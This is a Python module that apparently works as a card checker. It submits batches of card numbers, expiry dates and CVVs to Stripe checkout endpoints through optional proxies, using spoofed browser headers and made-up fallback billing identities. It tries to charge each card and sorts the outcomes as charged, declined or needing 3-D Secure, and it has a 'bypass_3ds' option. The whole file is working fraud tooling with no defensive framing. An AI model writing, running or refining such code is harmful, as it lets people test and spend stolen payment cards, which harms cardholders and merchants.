import time
import asyncio
import aiohttp

HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
}

_session = None


async def get_session():
    global _session
    if _session is None or _session.closed:
        _session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300),
            timeout=aiohttp.ClientTimeout(total=25, connect=8),
        )
    return _session


async def close_session():
    global _session
    if _session and not _session.closed:
        await _session.close()
    _session = None


def _card_display(card: dict) -> str:
    return f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}"


def _build_confirm_body(pm_id: str, pk: str, init_data: dict, bypass_3ds: bool) -> str:
    checksum = init_data.get("init_checksum", "")

    lig = init_data.get("line_item_group")
    inv = init_data.get("invoice")
    if lig:
        total = lig.get("total", 0)
        subtotal = lig.get("subtotal", 0)
        tax_exclusive = lig.get("total_exclusive_tax", 0)
        tax_inclusive = lig.get("total_inclusive_tax", 0)
        discount = lig.get("total_discount_amount", 0)
        shipping = lig.get("shipping_rate_amount", 0)
    elif inv:
        total = inv.get("total", 0)
        subtotal = inv.get("subtotal", 0)
        tax_exclusive = inv.get("total_exclusive_tax", inv.get("tax", 0))
        tax_inclusive = inv.get("total_inclusive_tax", 0)
        discount = inv.get("total_discount_amount", 0)
        shipping = inv.get("shipping_rate_amount", 0)
    else:
        pi = init_data.get("payment_intent") or {}
        si = init_data.get("setup_intent") or {}
        total = pi.get("amount", 0) or si.get("amount", 0)
        subtotal = total
        tax_exclusive = 0
        tax_inclusive = 0
        discount = 0
        shipping = 0

    conf_body = (
        f"eid=NA"
        f"&payment_method={pm_id}"
        f"&expected_amount={total}"
        f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
        f"&last_displayed_line_item_group_details[total_exclusive_tax]={tax_exclusive}"
        f"&last_displayed_line_item_group_details[total_inclusive_tax]={tax_inclusive}"
        f"&last_displayed_line_item_group_details[total_discount_amount]={discount}"
        f"&last_displayed_line_item_group_details[shipping_rate_amount]={shipping}"
        f"&expected_payment_method_type=card"
        f"&key={pk}"
        f"&init_checksum={checksum}"
    )

    if bypass_3ds:
        conf_body += "&return_url=https://checkout.stripe.com"

    return conf_body


async def charge_card(
    card: dict,
    checkout_data: dict,
    proxy_str: str = None,
    bypass_3ds: bool = False,
    max_retries: int = 2,
) -> dict:
    start = time.perf_counter()
    result = {
        "card": _card_display(card),
        "status": None,
        "response": None,
        "time": 0,
    }

    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")

    if not pk or not cs or not init_data:
        result["status"] = "FAILED"
        result["response"] = "No checkout data"
        result["time"] = round(time.perf_counter() - start, 2)
        return result

    for attempt in range(max_retries + 1):
        try:
            proxy_url = None
            if proxy_str:
                from functions.proxy_utils import get_proxy_url
                proxy_url = get_proxy_url(proxy_str)

            connector = aiohttp.TCPConnector(limit=100, ssl=False)
            async with aiohttp.ClientSession(connector=connector) as s:
                email = init_data.get("customer_email") or "john@example.com"

                cust = init_data.get("customer") or {}
                addr = cust.get("address") or {}
                name = cust.get("name") or "John Smith"
                country = addr.get("country") or init_data.get("account_settings", {}).get("country") or "US"
                line1 = addr.get("line1") or "476 West White Mountain Blvd"
                city = addr.get("city") or "Pinetop"
                state = addr.get("state") or "AZ"
                zip_code = addr.get("postal_code") or "85929"

                pm_body = (
                    f"type=card"
                    f"&card[number]={card['cc']}"
                    f"&card[cvc]={card['cvv']}"
                    f"&card[exp_month]={card['month']}"
                    f"&card[exp_year]={card['year']}"
                    f"&billing_details[name]={name}"
                    f"&billing_details[email]={email}"
                    f"&billing_details[address][country]={country}"
                    f"&billing_details[address][line1]={line1}"
                    f"&billing_details[address][city]={city}"
                    f"&billing_details[address][postal_code]={zip_code}"
                    f"&billing_details[address][state]={state}"
                    f"&key={pk}"
                )

                async with s.post(
                    "https://api.stripe.com/v1/payment_methods",
                    headers=HEADERS,
                    data=pm_body,
                    proxy=proxy_url,
                ) as r:
                    pm = await r.json()

                if "error" in pm:
                    err_msg = pm["error"].get("message", "Card error")
                    result["status"] = "DECLINED"
                    result["response"] = err_msg
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result

                pm_id = pm.get("id")
                if not pm_id:
                    result["status"] = "FAILED"
                    result["response"] = "No PM"
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result

                conf_body = _build_confirm_body(pm_id, pk, init_data, bypass_3ds)

                async with s.post(
                    f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
                    headers=HEADERS,
                    data=conf_body,
                    proxy=proxy_url,
                ) as r:
                    conf = await r.json()

                if "error" in conf:
                    err = conf["error"]
                    dc = err.get("decline_code", "")
                    msg = err.get("message", "Failed")
                    result["status"] = "DECLINED"
                    result["response"] = f"{dc.upper()}: {msg}" if dc else msg
                else:
                    pi = conf.get("payment_intent") or {}
                    si = conf.get("setup_intent") or {}
                    st = pi.get("status", "") or si.get("status", "") or conf.get("status", "")

                    if st == "succeeded":
                        result["status"] = "CHARGED"
                        result["response"] = "Payment Successful"
                    elif st == "requires_action":
                        if bypass_3ds:
                            result["status"] = "3DS SKIP"
                            result["response"] = "3DS Cannot be bypassed"
                        else:
                            result["status"] = "3DS"
                            result["response"] = "3DS Required"
                    elif st == "requires_payment_method":
                        result["status"] = "DECLINED"
                        result["response"] = "Card Declined"
                    elif st == "requires_confirmation":
                        result["status"] = "DECLINED"
                        result["response"] = "Requires Confirmation"
                    elif st == "processing":
                        result["status"] = "CHARGED"
                        result["response"] = "Payment Processing"
                    else:
                        result["status"] = "UNKNOWN"
                        result["response"] = st or "Unknown"

                result["time"] = round(time.perf_counter() - start, 2)
                return result

        except Exception as e:
            err_str = str(e)
            retryable = any(
                kw in err_str.lower()
                for kw in ("disconnect", "timeout", "connection", "reset", "broken")
            )
            if attempt < max_retries and retryable:
                await asyncio.sleep(1)
                continue
            result["status"] = "ERROR"
            result["response"] = err_str[:50]
            result["time"] = round(time.perf_counter() - start, 2)
            return result

    return result
